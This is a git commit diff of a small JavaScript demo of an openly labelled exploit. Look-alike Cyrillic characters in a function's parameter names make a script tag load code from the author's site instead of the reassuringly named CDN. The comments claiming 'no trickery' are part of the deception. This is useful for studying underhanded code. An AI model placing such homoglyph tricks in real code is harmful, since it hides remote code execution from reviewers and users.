380dce878cb894c0d359cb4ff92bfa8c37e9f8b8
Eedrah <eedrah@users.noreply.github.com>
2015-09-15 10:33:58 +1200

    only call function when script is loaded

--- entry.js
+++ entry.js
@@ -1,18 +1,18 @@
 var author = 'Jesse Eedrah';
-var site = 'http://eedrah.com/me';
+var site = 'http://eedrah.com/me/';
 console.log('Created by ' + author +  ', visit me at ' + site + ' to see how the exploit works');
 
 // Initialize with a random key
 var key = Math.random().toString().substring(2);
-console.log(key);
 
 // I didn't go out and buy a CDN account, but if this was real I would convince my company to pay. We need our own so that we control the (audited) source code so it won't change in the future.
 var secretCompanyCDN = 'https://cdnjs.cloudflare.com/ajax/libs/jsSHA/2.0.1/sha.js';
 var secretCompanyApiKey = '8601044367533177';
-importExternalLibrary(secretCompanyCDN, secretCompanyApiKey);
+
+// Run generateKey when loaded to display the help text
+importExternalLibrary(secretCompanyCDN, secretCompanyApiKey, generateKey);
 // There is no trickery in what was downloaded - I promise. The library wasn't touched. But please feel free to check yourself against the source code on github. Speaking of which, the explaination of this exploit is on my github.
 
-generateKey() // Run to display text
 function generateKey() {
 	var input = document.querySelector('#user-input').value;
 	var message;
@@ -36,11 +36,15 @@ function generateKey() {
 	document.querySelector('#result').textContent = message;
 }
 
-function importExternalLibrary (sitе, kеy) {
+function importExternalLibrary (sitе, kеy, callback) {
 	console.log('Downloading external library from ' + sitе + ' using API key ' + kеy);
 	var script = document.createElement('script');
 	script.setAttribute('type', 'text/javascript');
 	script.setAttribute('src', site + "?apikey=" + key);
 	var head = document.getElementsByTagName('head')[0];
+
+	script.onreadystatechange = callback;
+    script.onload = callback;
+
 	head.appendChild(script);
 }
